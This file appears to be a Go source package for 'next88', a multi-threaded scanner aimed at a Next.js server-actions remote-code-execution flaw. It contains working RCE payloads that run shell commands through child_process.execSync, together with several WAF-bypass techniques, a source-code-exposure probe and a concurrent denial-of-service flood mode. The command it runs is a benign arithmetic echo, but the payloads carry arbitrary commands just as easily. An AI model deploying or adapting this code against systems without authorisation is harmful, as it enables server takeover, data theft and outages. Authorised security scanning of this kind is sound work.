package next88

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

const (
	boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
)

// ScanResult mirrors the result structure from the original next88 tool.
type ScanResult struct {
	Host           string   `json:"host"`
	Vulnerable     *bool    `json:"vulnerable"` // nil = error, true = vulnerable, false = not vulnerable
	StatusCode     *int     `json:"status_code"`
	Error          string   `json:"error,omitempty"`
	Request        string   `json:"request,omitempty"`
	Response       string   `json:"response,omitempty"`
	FinalURL       string   `json:"final_url,omitempty"`
	TestedURL      string   `json:"tested_url,omitempty"`
	Timestamp      string   `json:"timestamp"`
	ActionIDsFound []string `json:"action_ids_found,omitempty"`
	ExposedCode    bool     `json:"exposed_code,omitempty"`
	RequestBody    string   `json:"request_body,omitempty"`
	ResponseBody   string   `json:"response_body,omitempty"`
	VulnType       string   `json:"vuln_type,omitempty"` // Type of vulnerability: "normal", "waf-bypass", "vercel-waf-bypass", "dos-test", "source-exposure"
}

// ScanOptions controls how a scan is executed. It is intentionally very
// close to the CLI flags of the original project so behaviour stays
// familiar and predictable.
type ScanOptions struct {
	Timeout         time.Duration
	VerifySSL       bool
	FollowRedirects bool
	SafeCheck       bool
	Windows         bool
	WAFBypass       bool
	WAFBypassSizeKB int
	VercelWAFBypass bool
	Paths           []string
	DoubleEncode    bool
	SemicolonBypass bool
	CheckSourceExp  bool
	CustomHeaders   map[string]string
	Threads         int
	Quiet           bool
	Verbose         bool
	NoColor         bool
	AllResults      bool
	DiscordWebhook  string
	DOSTest         bool
	DOSRequests     int
	SmartScan       bool
}

var (
	red     = color.New(color.FgRed)
	green   = color.New(color.FgGreen)
	yellow  = color.New(color.FgYellow)
	blue    = color.New(color.FgBlue)
	cyan    = color.New(color.FgCyan)
	bold    = color.New(color.Bold)
	redBold = color.New(color.FgRed, color.Bold)
)

func initColors(noColor bool) {
	if noColor {
		color.NoColor = true
	}
}

func printBanner() {
	cyan.Println("brought to you by assetnote")
	fmt.Println()
}

func generateJunkData(sizeBytes int) (string, string) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	paramName := make([]byte, 12)
	for i := range paramName {
		paramName[i] = charset[rand.Intn(len(charset))]
	}

	junk := make([]byte, sizeBytes)
	for i := range junk {
		junk[i] = charset[rand.Intn(len(charset))]
	}

	return string(paramName), string(junk)
}

func buildSafePayload() (string, string) {
	body := fmt.Sprintf(
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"1\"\r\n\r\n"+
			"{}\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"0\"\r\n\r\n"+
			"[\"$1:aa:aa\"]\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
	)
	contentType := fmt.Sprintf("multipart/form-data; boundary=%s", boundary)
	return body, contentType
}

func buildVercelWAFBypassPayload() (string, string) {
	part0 := `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $((41*271))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: ` + "`NEXT_REDIRECT;push;/login?a=${res};307;`" + `});","_chunks":"$Q2","_formData":{"get":"$3:\"$$:constructor:constructor"}}}`

	body := fmt.Sprintf(
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"0\"\r\n\r\n"+
			"%s\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"1\"\r\n\r\n"+
			"\"$@0\"\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"2\"\r\n\r\n"+
			"[]\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"3\"\r\n\r\n"+
			"{\"\\\"$$\":{}}\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
		part0,
	)
	contentType := fmt.Sprintf("multipart/form-data; boundary=%s", boundary)
	return body, contentType
}

func buildRCEPayload(windows bool, wafBypass bool, wafBypassSizeKB int) (string, string) {
	var cmd string
	if windows {
		cmd = `powershell -c \"41*271\"`
	} else {
		cmd = "echo $((41*271))"
	}

	prefixPayload := fmt.Sprintf(
		"var res=process.mainModule.require('child_process').execSync('%s')"+
			".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"+
			"{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
		cmd,
	)

	part0 := fmt.Sprintf(
		`{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"%s","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`,
		prefixPayload,
	)

	var parts []string

	if wafBypass {
		paramName, junk := generateJunkData(wafBypassSizeKB * 1024)
		parts = append(parts, fmt.Sprintf(
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
				"Content-Disposition: form-data; name=\"%s\"\r\n\r\n"+
				"%s\r\n",
			paramName, junk,
		))
	}

	parts = append(parts,
		fmt.Sprintf(
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
				"Content-Disposition: form-data; name=\"0\"\r\n\r\n"+
				"%s\r\n",
			part0,
		),
		fmt.Sprintf(
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
				"Content-Disposition: form-data; name=\"1\"\r\n\r\n"+
				"\"$@0\"\r\n",
		),
		fmt.Sprintf(
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
				"Content-Disposition: form-data; name=\"2\"\r\n\r\n"+
				"[]\r\n",
		),
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
	)

	body := strings.Join(parts, "")
	contentType := fmt.Sprintf("multipart/form-data; boundary=%s", boundary)
	return body, contentType
}

func urlEncodeDouble(text string) string {
	return url.QueryEscape(url.QueryEscape(text))
}

func addSemicolonBypass(text string) string {
	text = strings.ReplaceAll(text, "execSync", ";execSync")
	text = strings.ReplaceAll(text, "child_process", "child_process;")
	text = strings.ReplaceAll(text, "require(", "require;(")
	text = strings.ReplaceAll(text, "process.", "process;.")
	return text
}

func normalizeHost(host string) string {
	host = strings.TrimSpace(host)
	if host == "" {
		return ""
	}
	if !strings.HasPrefix(host, "http://") && !strings.HasPrefix(host, "https://") {
		host = "https://" + host
	}
	return strings.TrimSuffix(host, "/")
}

func isVulnerableSafeCheck(resp *http.Response) bool {
	if resp.StatusCode != 500 {
		return false
	}

	bodyBytes, _ := io.ReadAll(resp.Body)
	defer resp.Body.Close()
	body := string(bodyBytes)

	if !strings.Contains(body, `E{"digest"`) {
		return false
	}

	serverHeader := strings.ToLower(resp.Header.Get("Server"))
	hasNetlifyVary := resp.Header.Get("Netlify-Vary") != ""
	isMitigated := hasNetlifyVary || serverHeader == "netlify" || serverHeader == "vercel"

	return !isMitigated
}

func isVulnerableRCECheck(resp *http.Response) bool {
	redirectHeader := resp.Header.Get("X-Action-Redirect")
	matched, _ := regexp.MatchString(`.*/login\?a=11111.*`, redirectHeader)
	return matched
}

func extractActionIDs(htmlContent string) []string {
	patterns := []string{
		`ACTION_ID_([a-f0-9]{40,50})`,
		`["']?\$?ACTION_ID_([a-f0-9]{40,50})["']?`,
		`value=["']?\$?ACTION_ID_([a-f0-9]{40,50})["']?`,
		`data-action-id=["']([a-f0-9]{40,50})["']`,
	}

	seen := make(map[string]bool)
	var actionIDs []string

	for _, pattern := range patterns {
		re := regexp.MustCompile("(?i)" + pattern)
		matches := re.FindAllStringSubmatch(htmlContent, -1)
		for _, match := range matches {
			if len(match) > 1 && !seen[match[1]] {
				seen[match[1]] = true
				actionIDs = append(actionIDs, match[1])
			}
		}
	}

	return actionIDs
}

func isSourceCodeExposed(resp *http.Response) bool {
	if resp.StatusCode != 200 {
		return false
	}

	bodyBytes, _ := io.ReadAll(resp.Body)
	defer resp.Body.Close()
	body := string(bodyBytes)

	indicators := []string{
		`async\s+function\s+\w+`,
		`function\s+\w+\s*\([^)]*\)\s*\{`,
		`const\s+\w+\s*=\s*(async\s+)?\([^)]*\)\s*=>`,
		`(secret|api[_-]?key|private[_-]?key|access[_-]?token)\s*[:=]\s*["'][^"']+["']`,
		`INTERNAL[_-]?SECRET`,
		`SECRET[_-]?KEY`,
		`INSERT\s+INTO\s+\w+`,
		`SELECT\s+.*\s+FROM\s+\w+`,
		`UPDATE\s+\w+\s+SET`,
		`"b"\s*:\s*"development"`,
		`"development"`,
		`//\s*VULNERABLE`,
		`/\*\s*VULNERABLE`,
		`inserted["']?\s*:\s*["']?.*function`,
		`inserted["']?\s*:\s*["']?.*async`,
	}

	for _, pattern := range indicators {
		matched, _ := regexp.MatchString("(?i)"+pattern, body)
		if matched {
			return true
		}
	}

	return false
}

func sendPayload(targetURL string, headers map[string]string, body string, timeout time.Duration, verifySSL bool, doubleEncode bool, semicolonBypass bool) (*http.Response, error) {
	modifiedBody := body

	if semicolonBypass {
		modifiedBody = addSemicolonBypass(modifiedBody)
	}

	if doubleEncode {
		modifiedBody = urlEncodeDouble(modifiedBody)
	}

	req, err := http.NewRequest("POST", targetURL, strings.NewReader(modifiedBody))
	if err != nil {
		return nil, err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	if !verifySSL {
		client.Transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}

	return resp, nil
}

func checkActionIDExposure(host string, opts ScanOptions) ScanResult {
	result := ScanResult{
		Host:           host,
		Vulnerable:     nil,
		ActionIDsFound: []string{},
		Timestamp:      time.Now().UTC().Format(time.RFC3339) + "Z",
	}

	host = normalizeHost(host)
	if host == "" {
		result.Error = "Invalid or empty host"
		return result
	}

	headers := map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
		"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	}

	for k, v := range opts.CustomHeaders {
		headers[k] = v
	}

	resp, err := sendPayload(host, headers, "", opts.Timeout, opts.VerifySSL, false, false)
	if err != nil {
		result.Error = fmt.Sprintf("Failed to fetch HTML: %v", err)
		return result
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		notVuln := false
		result.Vulnerable = &notVuln
		result.StatusCode = &resp.StatusCode
		result.Error = fmt.Sprintf("Failed to fetch HTML: HTTP %d", resp.StatusCode)
		return result
	}

	bodyBytes, _ := io.ReadAll(resp.Body)
	htmlContent := string(bodyBytes)

	actionIDs := extractActionIDs(htmlContent)
	result.ActionIDsFound = actionIDs
	result.TestedURL = host
	result.FinalURL = resp.Request.URL.String()

	if len(actionIDs) == 0 {
		notVuln := false
		result.Vulnerable = &notVuln
		return result
	}

	for _, actionID := range actionIDs {
		// Build payload with padding for WAF bypass
		padding := strings.Repeat("_AAAAA_REPEATED_", 100)
		payloadJSON := fmt.Sprintf(`{"id":"%s","bound":null}`, actionID)
		body := fmt.Sprintf("fearsoff=%s[\"$F1\"]&1=%s", padding, payloadJSON)

		postHeaders := map[string]string{
			"User-Agent":              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
			"Next-Action":             actionID,
			"X-Nextjs-Request-Id":     "b5dce965",
			"Content-Type":            "application/x-www-form-urlencoded",
			"Accept":                  "text/x-component",
			"X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
		}

		for k, v := range opts.CustomHeaders {
			postHeaders[k] = v
		}

		postResp, err := sendPayload(host, postHeaders, body, opts.Timeout, opts.VerifySSL, false, false)
		if err != nil {
			continue
		}

		// Read response for storage
		postRespBodyBytes, _ := io.ReadAll(postResp.Body)
		postResp.Body.Close()
		postRespBody := string(postRespBodyBytes)

		// Store request/response
		parsedURL, _ := url.Parse(host)
		hostHeader := parsedURL.Host
		if hostHeader == "" {
			hostHeader = host
		}
		reqStr := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\n", host, hostHeader)
		for k, v := range postHeaders {
			reqStr += fmt.Sprintf("%s: %s\r\n", k, v)
		}
		reqStr += fmt.Sprintf("Content-Length: %d\r\n\r\n%s", len(body), body)

		respStr := fmt.Sprintf("HTTP/1.1 %d %s\r\n", postResp.StatusCode, http.StatusText(postResp.StatusCode))
		for k, v := range postResp.Header {
			respStr += fmt.Sprintf("%s: %s\r\n", k, strings.Join(v, ", "))
		}
		respStr += fmt.Sprintf("\r\n%s", postRespBody[:min(2000, len(postRespBody))])

		result.Request = reqStr
		result.Response = respStr
		result.RequestBody = body
		result.ResponseBody = postRespBody[:min(5000, len(postRespBody))]

		if isSourceCodeExposed(postResp) {
			vuln := true
			result.Vulnerable = &vuln
			result.ExposedCode = true
			result.VulnType = "source-exposure"
			result.StatusCode = &postResp.StatusCode
			return result
		}
	}

	notVuln := false
	result.Vulnerable = &notVuln
	return result
}

func checkVulnerability(host string, opts ScanOptions) ScanResult {
	result := ScanResult{
		Host:       host,
		Vulnerable: nil,
		Timestamp:  time.Now().UTC().Format(time.RFC3339) + "Z",
	}

	host = normalizeHost(host)
	if host == "" {
		result.Error = "Invalid or empty host"
		return result
	}

	// Smart scan: try different methods sequentially until vulnerability found
	if opts.SmartScan {
		return checkVulnerabilitySmart(host, opts)
	}

	testPaths := opts.Paths
	if len(testPaths) == 0 {
		testPaths = []string{"/"}
	}

	var body, contentType string
	var isVulnerable func(*http.Response) bool

	if opts.SafeCheck {
		body, contentType = buildSafePayload()
		isVulnerable = isVulnerableSafeCheck
	} else if opts.VercelWAFBypass {
		body, contentType = buildVercelWAFBypassPayload()
		isVulnerable = isVulnerableRCECheck
	} else {
		body, contentType = buildRCEPayload(opts.Windows, opts.WAFBypass, opts.WAFBypassSizeKB)
		isVulnerable = isVulnerableRCECheck
	}

	headers := map[string]string{
		"User-Agent":              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
		"Next-Action":             "x",
		"X-Nextjs-Request-Id":     "b5dce965",
		"Content-Type":            contentType,
		"X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
	}

	for k, v := range opts.CustomHeaders {
		headers[k] = v
	}

	for idx, path := range testPaths {
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}

		testURL := host + path
		result.TestedURL = testURL
		result.FinalURL = testURL

		resp, err := sendPayload(testURL, headers, body, opts.Timeout, opts.VerifySSL, opts.DoubleEncode, opts.SemicolonBypass)

		if err != nil {
			errStr := err.Error()
			if !opts.SafeCheck && strings.Contains(errStr, "timeout") {
				notVuln := false
				result.Vulnerable = &notVuln
				result.Error = "Request timed out"
				if idx < len(testPaths)-1 {
					continue
				}
				return result
			}
			if idx < len(testPaths)-1 {
				continue
			}
			result.Error = errStr
			return result
		}

		statusCode := resp.StatusCode
		result.StatusCode = &statusCode

		// Read response body for storage
		respBodyBytes, _ := io.ReadAll(resp.Body)
		defer resp.Body.Close()
		respBody := string(respBodyBytes)

		// Store request/response for notifications
		parsedURL, _ := url.Parse(testURL)
		hostHeader := parsedURL.Host
		if hostHeader == "" {
			hostHeader = host
		}
		reqStr := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\n", testURL, hostHeader)
		for k, v := range headers {
			reqStr += fmt.Sprintf("%s: %s\r\n", k, v)
		}
		reqStr += fmt.Sprintf("Content-Length: %d\r\n\r\n%s", len(body), body)

		respStr := fmt.Sprintf("HTTP/1.1 %d %s\r\n", resp.StatusCode, http.StatusText(resp.StatusCode))
		for k, v := range resp.Header {
			respStr += fmt.Sprintf("%s: %s\r\n", k, strings.Join(v, ", "))
		}
		respStr += fmt.Sprintf("\r\n%s", respBody[:min(2000, len(respBody))])

		result.Request = reqStr
		result.Response = respStr
		result.RequestBody = body
		result.ResponseBody = respBody[:min(5000, len(respBody))]

		if isVulnerable(resp) {
			vuln := true
			result.Vulnerable = &vuln
			return result
		}
	}

	notVuln := false
	result.Vulnerable = &notVuln
	return result
}

func checkVulnerabilitySmart(host string, opts ScanOptions) ScanResult {
	// Smart scan flow: try methods sequentially until vulnerability found
	testPaths := opts.Paths
	if len(testPaths) == 0 {
		testPaths = []string{"/"}
	}

	headers := map[string]string{
		"User-Agent":              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
		"Next-Action":             "x",
		"X-Nextjs-Request-Id":     "b5dce965",
		"X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
	}

	for k, v := range opts.CustomHeaders {
		headers[k] = v
	}

	// Step 1: Try normal RCE payload (no WAF bypass)
	if !opts.Quiet && opts.Verbose {
		fmt.Fprintf(os.Stderr, "[*] Trying normal RCE payload for %s\n", host)
	}
	body, contentType := buildRCEPayload(opts.Windows, false, 0)
	headers["Content-Type"] = contentType
	result := tryVulnerabilityTest(host, testPaths, headers, body, opts)
	if result.Vulnerable != nil && *result.Vulnerable {
		result.VulnType = "normal"
		return result
	}

	// Step 2: Try WAF bypass
	if !opts.Quiet && opts.Verbose {
		fmt.Fprintf(os.Stderr, "[*] Trying WAF bypass for %s\n", host)
	}
	body, contentType = buildRCEPayload(opts.Windows, true, opts.WAFBypassSizeKB)
	headers["Content-Type"] = contentType
	result = tryVulnerabilityTest(host, testPaths, headers, body, opts)
	if result.Vulnerable != nil && *result.Vulnerable {
		result.VulnType = "waf-bypass"
		return result
	}

	// Step 3: Try Vercel WAF bypass
	if !opts.Quiet && opts.Verbose {
		fmt.Fprintf(os.Stderr, "[*] Trying Vercel WAF bypass for %s\n", host)
	}
	body, contentType = buildVercelWAFBypassPayload()
	headers["Content-Type"] = contentType
	result = tryVulnerabilityTest(host, testPaths, headers, body, opts)
	if result.Vulnerable != nil && *result.Vulnerable {
		result.VulnType = "vercel-waf-bypass"
		return result
	}

	// Step 4: Try common paths (if paths file exists)
	pathsFile := "/app/Wordlists/react-nextjs-paths.txt"
	if _, err := os.Stat(pathsFile); err == nil {
		if !opts.Quiet && opts.Verbose {
			fmt.Fprintf(os.Stderr, "[*] Trying common paths for %s\n", host)
		}
		commonPaths, err := loadPaths(pathsFile)
		if err == nil && len(commonPaths) > 0 {
			body, contentType = buildRCEPayload(opts.Windows, true, opts.WAFBypassSizeKB)
			headers["Content-Type"] = contentType
			result = tryVulnerabilityTest(host, commonPaths, headers, body, opts)
			if result.Vulnerable != nil && *result.Vulnerable {
				result.VulnType = "waf-bypass" // Common paths use WAF bypass payload
				return result
			}
		}
	}

	// Not vulnerable after all attempts
	notVuln := false
	result.Vulnerable = &notVuln
	return result
}

func tryVulnerabilityTest(host string, testPaths []string, headers map[string]string, body string, opts ScanOptions) ScanResult {
	result := ScanResult{
		Host:       host,
		Vulnerable: nil,
		Timestamp:  time.Now().UTC().Format(time.RFC3339) + "Z",
	}

	for idx, path := range testPaths {
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}

		testURL := host + path
		result.TestedURL = testURL
		result.FinalURL = testURL

		resp, err := sendPayload(testURL, headers, body, opts.Timeout, opts.VerifySSL, opts.DoubleEncode, opts.SemicolonBypass)

		if err != nil {
			if idx < len(testPaths)-1 {
				continue
			}
			result.Error = err.Error()
			return result
		}

		statusCode := resp.StatusCode
		result.StatusCode = &statusCode

		// Read response body for storage
		respBodyBytes, _ := io.ReadAll(resp.Body)
		defer resp.Body.Close()
		respBody := string(respBodyBytes)

		// Store request/response for notifications
		parsedURL, _ := url.Parse(testURL)
		hostHeader := parsedURL.Host
		if hostHeader == "" {
			hostHeader = host
		}
		reqStr := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\n", testURL, hostHeader)
		for k, v := range headers {
			reqStr += fmt.Sprintf("%s: %s\r\n", k, v)
		}
		reqStr += fmt.Sprintf("Content-Length: %d\r\n\r\n%s", len(body), body)

		respStr := fmt.Sprintf("HTTP/1.1 %d %s\r\n", resp.StatusCode, http.StatusText(resp.StatusCode))
		for k, v := range resp.Header {
			respStr += fmt.Sprintf("%s: %s\r\n", k, strings.Join(v, ", "))
		}
		respStr += fmt.Sprintf("\r\n%s", respBody[:min(2000, len(respBody))])

		result.Request = reqStr
		result.Response = respStr
		result.RequestBody = body
		result.ResponseBody = respBody[:min(5000, len(respBody))]

		if isVulnerableRCECheck(resp) {
			vuln := true
			result.Vulnerable = &vuln
			return result
		}
	}

	return result
}

func loadHosts(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var hosts []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			hosts = append(hosts, line)
		}
	}
	return hosts, scanner.Err()
}

func loadPaths(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var paths []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			if !strings.HasPrefix(line, "/") {
				line = "/" + line
			}
			paths = append(paths, line)
		}
	}
	return paths, scanner.Err()
}

func printResult(result ScanResult, verbose bool) {
	host := result.Host
	if result.Vulnerable != nil {
		if *result.Vulnerable {
			redBold.Print("[VULNERABLE] ")
			cyan.Println(host)
			if result.StatusCode != nil {
				fmt.Printf("  Status: %d\n", *result.StatusCode)
			}
			if len(result.ActionIDsFound) > 0 {
				ids := strings.Join(result.ActionIDsFound[:min(3, len(result.ActionIDsFound))], ", ")
				yellow.Printf("  -> Found %d ACTION_ID(s): %s\n", len(result.ActionIDsFound), ids)
				if len(result.ActionIDsFound) > 3 {
					yellow.Printf("  -> ... and %d more\n", len(result.ActionIDsFound)-3)
				}
			}
			if result.ExposedCode {
				redBold.Println("  -> Source code exposed in response!")
			}
		} else {
			green.Print("[NOT VULNERABLE] ")
			if result.StatusCode != nil {
				fmt.Printf("%s - Status: %d\n", host, *result.StatusCode)
			} else {
				fmt.Print(host)
				if result.Error != "" {
					fmt.Printf(" - %s", result.Error)
				}
				fmt.Println()
			}
		}
	} else {
		yellow.Print("[ERROR] ")
		fmt.Print(host)
		if result.Error != "" {
			fmt.Printf(" - %s", result.Error)
		} else {
			fmt.Print(" - Unknown error")
		}
		fmt.Println()
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func buildDOSPayload() string {
	// DoS payload as specified by user
	body := "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
	body += "Content-Disposition: form-data; name=\"0\"; filename=\"ddd\"\r\n"
	body += "\r\n"
	body += "\"$@0\"\r\n"
	body += "------WebKitFormBoundary7MA4YWxkTrZu0gW--"
	return body
}

func checkDOS(host string, opts ScanOptions) ScanResult {
	result := ScanResult{
		Host:       host,
		Vulnerable: nil,
		Timestamp:  time.Now().UTC().Format(time.RFC3339) + "Z",
	}

	host = normalizeHost(host)
	if host == "" {
		result.Error = "Invalid or empty host"
		return result
	}

	// Build DoS payload
	body := buildDOSPayload()
	contentType := "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"

	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
		"Next-Action":  "x",
		"Content-Type": contentType,
	}

	for k, v := range opts.CustomHeaders {
		headers[k] = v
	}

	// Send multiple requests concurrently
	var wg sync.WaitGroup
	successCount := 0
	errorCount := 0
	var successMutex sync.Mutex
	var errorMutex sync.Mutex

	startTime := time.Now()
	requestCount := opts.DOSRequests
	if requestCount <= 0 {
		requestCount = 100 // Default
	}

	// Use goroutines to send requests concurrently
	concurrency := min(opts.Threads, requestCount)
	if concurrency <= 0 {
		concurrency = 1
	}
	requestsPerWorker := requestCount / concurrency
	if requestsPerWorker == 0 {
		requestsPerWorker = 1
	}

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			requestsToSend := requestsPerWorker
			if workerID == concurrency-1 {
				// Last worker handles remainder
				requestsToSend = requestCount - (workerID * requestsPerWorker)
			}

			for j := 0; j < requestsToSend; j++ {
				req, err := http.NewRequest("POST", host, strings.NewReader(body))
				if err != nil {
					errorMutex.Lock()
					errorCount++
					errorMutex.Unlock()
					continue
				}

				for k, v := range headers {
					req.Header.Set(k, v)
				}

				client := &http.Client{
					Timeout: opts.Timeout,
					CheckRedirect: func(req *http.Request, via []*http.Request) error {
						return http.ErrUseLastResponse
					},
				}

				if !opts.VerifySSL {
					tr := &http.Transport{
						TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
					}
					client.Transport = tr
				}

				resp, err := client.Do(req)
				if err != nil {
					errorMutex.Lock()
					errorCount++
					errorMutex.Unlock()
					continue
				}

				// Read response body (or at least some of it)
				io.CopyN(io.Discard, resp.Body, 1024)
				resp.Body.Close()

				successMutex.Lock()
				successCount++
				successMutex.Unlock()
			}
		}(i)
	}

	wg.Wait()
	duration := time.Since(startTime)

	// Consider it vulnerable if we can send requests successfully
	// (DoS test is about testing if the server can be overwhelmed)
	vuln := successCount > 0
	result.Vulnerable = &vuln
	if vuln {
		result.VulnType = "dos-test"
	}

	// Store statistics in the response field
	parsedURL, _ := url.Parse(host)
	hostHeader := parsedURL.Host
	if hostHeader == "" {
		hostHeader = host
	}
	result.Request = fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\n", host, hostHeader)
	for k, v := range headers {
		result.Request += fmt.Sprintf("%s: %s\r\n", k, v)
	}
	result.Request += fmt.Sprintf("Content-Length: %d\r\n\r\n%s", len(body), body)

	result.Response = fmt.Sprintf("DoS Test Results:\n")
	result.Response += fmt.Sprintf("Total Requests: %d\n", requestCount)
	result.Response += fmt.Sprintf("Successful: %d\n", successCount)
	result.Response += fmt.Sprintf("Errors: %d\n", errorCount)
	result.Response += fmt.Sprintf("Duration: %v\n", duration)
	if duration > 0 {
		result.Response += fmt.Sprintf("Requests/sec: %.2f\n", float64(successCount)/duration.Seconds())
	}

	statusCode := 200
	result.StatusCode = &statusCode

	return result
}

func urlparse(urlStr string) *url.URL {
	parsed, _ := url.Parse(urlStr)
	return parsed
}

// Run executes a scan for the provided hosts using the supplied options.
//
// It reuses the original next88 scanning logic but exposes it as a
// programmatic API (no flag parsing, no os.Exit).
func Run(hosts []string, opts ScanOptions) ([]ScanResult, error) {
	if len(hosts) == 0 {
		return nil, fmt.Errorf("no hosts provided to next88 scan")
	}

	if opts.Threads <= 0 {
		opts.Threads = 10
	}

	if opts.Timeout == 0 {
		opts.Timeout = 10 * time.Second
	}

	if opts.WAFBypassSizeKB <= 0 {
		opts.WAFBypassSizeKB = 128
	}

	if opts.CustomHeaders == nil {
		opts.CustomHeaders = make(map[string]string)
	}

	initColors(opts.NoColor)

	// Prepare worker pool
	hostChan := make(chan string, len(hosts))
	for _, h := range hosts {
		hostChan <- h
	}
	close(hostChan)

	results := make([]ScanResult, 0, len(hosts))
	var resultsMu sync.Mutex

	var wg sync.WaitGroup

	for i := 0; i < opts.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for host := range hostChan {
				var res ScanResult
				if opts.DOSTest {
					res = checkDOS(host, opts)
				} else if opts.CheckSourceExp {
					res = checkActionIDExposure(host, opts)
				} else {
					res = checkVulnerability(host, opts)
				}

				resultsMu.Lock()
				results = append(results, res)
				resultsMu.Unlock()
			}
		}()
	}

	wg.Wait()
	return results, nil
}
